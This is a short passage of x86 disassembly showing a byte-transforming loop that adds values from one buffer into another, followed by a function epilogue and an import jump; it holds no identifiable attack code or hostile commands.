  416a2b:	add    eax,0x1
  416a2e:	mov    DWORD PTR [ebp-0x4],eax
  416a31:	mov    cl,BYTE PTR [ebp-0x11]
  416a34:	mov    BYTE PTR [ebp-0x29],cl
  416a37:	push   edx
  416a38:	pop    ebx
  416a39:	mov    ecx,ebx
  416a3b:	mov    edx,DWORD PTR [ebp-0x10]
  416a3e:	add    edx,DWORD PTR [ebp-0x4]
  416a41:	mov    al,BYTE PTR [ebp-0x29]
  416a44:	mov    BYTE PTR [edx],al
  416a46:	mov    ebx,esi
  416a48:	mov    ecx,DWORD PTR [ebp+0x14]
  416a4b:	add    ecx,DWORD PTR [ebp-0x8]
  416a4e:	movzx  edx,BYTE PTR [ecx]
  416a51:	mov    DWORD PTR [ebp-0xc],edx
  416a54:	mov    eax,DWORD PTR [ebp-0x8]
  416a57:	mov    ecx,DWORD PTR [ebp-0x28]
  416a5a:	add    eax,ecx
  416a5c:	mov    DWORD PTR [ebp-0x8],eax
  416a5f:	mov    eax,DWORD PTR [ebp-0x8]
  416a62:	shr    eax,0x3
  416a65:	mov    ecx,0x1
  416a6a:	sub    ecx,eax
  416a6c:	mov    DWORD PTR [ebp-0x20],ecx
  416a6f:	shr    eax,cl
  416a71:	mov    edx,DWORD PTR [ebp-0x8]
  416a74:	imul   edx,DWORD PTR [ebp-0x20]
  416a78:	mov    DWORD PTR [ebp-0x8],edx
  416a7b:	shl    ebx,0x3
  416a7e:	mov    eax,DWORD PTR [ebp-0x10]
  416a81:	add    eax,DWORD PTR [ebp-0x4]
  416a84:	movzx  ecx,BYTE PTR [eax]
  416a87:	add    ecx,DWORD PTR [ebp-0xc]
  416a8a:	mov    edx,DWORD PTR [ebp-0x10]
  416a8d:	add    edx,DWORD PTR [ebp-0x4]
  416a90:	mov    BYTE PTR [edx],cl
  416a92:	mov    eax,DWORD PTR [ebp-0x4]
  416a95:	sub    eax,0x2
  416a98:	mov    DWORD PTR [ebp-0x4],eax
  416a9b:	mov    ecx,DWORD PTR [ebp-0x4]
  416a9e:	cmp    ecx,DWORD PTR [ebp+0x10]
  416aa1:	jl     0x416a13
  416aa7:	pop    ebx
  416aa8:	mov    esp,ebp
  416aaa:	pop    ebp
  416aab:	ret    
  416aac:	jmp    DWORD PTR ds:0x417020
